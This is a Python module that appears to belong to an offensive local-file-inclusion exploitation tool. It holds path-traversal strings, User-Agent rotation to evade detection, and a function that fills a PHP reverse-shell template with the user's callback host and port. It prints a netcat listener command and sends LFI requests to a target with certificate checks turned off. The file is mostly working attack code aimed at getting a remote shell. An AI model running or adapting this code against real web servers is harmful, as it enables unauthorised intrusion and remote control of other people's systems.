import sys
import time
import random
from os.path import dirname, abspath, join
from shutil import copy2
import requests
from urllib3.exceptions import InsecureRequestWarning

PATH_TRAVERSAL = ["../", "..\\", "/../", "./../"]
HERE = dirname(abspath(__file__))

SHELL = join(HERE, "shell.php")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# User-Agent rotation pool
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
]

# Rate limiting configuration
RATE_LIMIT_DELAY = 0.1  # Default delay between requests in seconds
REQUEST_TIMEOUT = (5, 15)  # connect timeout, read timeout


def is_interactive():
    return sys.stdin.isatty()


def prompt_input(message, default=""):
    if is_interactive():
        return input(message)
    return default


def resolve_location(location, default):
    return location or default


class listener:
    """Generate payload that could be used by Metasploit"""

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def handler(self):
        print(colors("[~] Start your listener by running", 93), end="")
        print(colors(" nc -ntlp {}".format(self.lport), 91))


def msf_payload():
    """Use msfvenom to generate reverse shell payload"""
    filepath = "/tmp/shell.php"
    lhost = prompt_input(colors("[?] Host For Callbacks: ", 94), "127.0.0.1")
    lport = prompt_input(colors("[?] Port For Callbacks: ", 94), "4444")

    print(colors("[~] Generating PHP listener", 93))

    copy2(SHELL, filepath)

    with open(filepath, "r") as f:
        payload = f.read()

    payload = payload.replace("127.0.0.1", lhost)
    payload = payload.replace("4444", lport)

    with open(filepath, "w") as f:
        f.write(payload)

    print(colors("[+] Success! ", 92))
    print(colors("[~] listener: /tmp/shell.php", 93))

    return lhost, lport, "shell"


def colors(string, color):
    """Make things colorfull

    Arguments:
        string {str} -- String to apply colors on
        color {int} -- value of color to apply

    """
    return "\033[%sm%s\033[0m" % (color, string)


def cook(cookies):
    c = {}
    for item in cookies.split(";"):
        if "=" not in item:
            continue
        key, value = item.split("=", 1)
        c[key.strip()] = value.strip()
    return c


def parse_headers(header_string):
    """Parse custom headers from command line format"""
    if not header_string:
        return {}

    headers = {}
    for header in header_string.split(","):
        if ":" in header:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()
    return headers


def parse_post_data(data_string):
    """Parse POST data from command line format"""
    if not data_string:
        return {}

    data = {}
    for param in data_string.split("&"):
        if "=" in param:
            key, value = param.split("=", 1)
            data[key] = value
    return data


def get_random_user_agent():
    """Get a random User-Agent from the pool"""
    return random.choice(USER_AGENTS)


def apply_rate_limit(delay=None):
    """Apply rate limiting delay between requests"""
    if delay is None:
        delay = RATE_LIMIT_DELAY
    if delay > 0:
        time.sleep(delay + random.uniform(0, 0.1))  # Add small random jitter


def attack(
    target,
    location,
    cookies=None,
    headers=None,
    payload=None,
    traverse=False,
    relative=False,
    data=None,
    dt=False,
    detection_mode=False,
    method="GET",
    post_data=None,
    custom_headers=None,
    rate_limit=True,
    user_agent_rotation=True,
):
    """Perform specified type of LFI attack

    Arguments:
        target {str} -- Target URL
        location {str} -- Specific location to test

    Keyword Arguments:
        cookies {str} -- Authenticate with cookies (default: {None})
        headers {str} -- Specify headers (default: {None})
        payload {str} -- Custom payload (default: {None})
        traverse {bool} -- traverse the URL (default: {False})
        relative {bool} -- check for relative URL (default: {False})
        dt {bool}  --  Test for directory traversal (default: {False})
    """

    url = target + location
    method = method.upper()

    # Merge custom headers with default headers without mutating caller-owned dicts.
    request_headers = dict(headers or {})
    if custom_headers:
        request_headers.update(custom_headers)

    # Add User-Agent if not specified
    if "User-Agent" not in request_headers:
        if user_agent_rotation:
            request_headers["User-Agent"] = get_random_user_agent()
        else:
            request_headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )

    def send_request(request_url, request_location=location):
        if rate_limit:
            apply_rate_limit()

        if method == "POST":
            if data is not None:
                body = data
                request_url = target
            elif post_data:
                body = post_data
            else:
                body = {"file": request_location}
                request_url = request_url.split("?")[0]

            return requests.post(
                request_url,
                headers=request_headers,
                cookies=cookies,
                data=body,
                verify=False,
                timeout=REQUEST_TIMEOUT,
            )

        return requests.get(
            request_url,
            headers=request_headers,
            cookies=cookies,
            verify=False,
            timeout=REQUEST_TIMEOUT,
        )

    try:
        if relative:
            response = None
            for traversal in PATH_TRAVERSAL:
                for i in range(10):
                    relative_location = traversal * i + location
                    response = send_request(target + relative_location, relative_location)
                    if response.status_code != 200:
                        from .rich_output import print_error

                        print_error("Unexpected HTTP Response")

            if not detection_mode:
                from .rich_output import print_error

                print_error("Try Refreshing Your Browser If You Haven't Gotten A Shell")
            return response

        response = send_request(url)

        if response.status_code != 200:
            from .rich_output import print_error

            print_error("Unexpected HTTP Response")
            if is_interactive():
                sys.exit(1)
            return response

        if dt:
            print(colors("[+] Vulnerable: " + url, 92))
        elif not detection_mode:
            from .rich_output import print_error

            print_error("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell")

        return response

    except Exception as e:
        from .rich_output import print_error

        print_error("HTTP Error")
        print_error(str(e))
        if is_interactive():
            sys.exit(1)
        return None
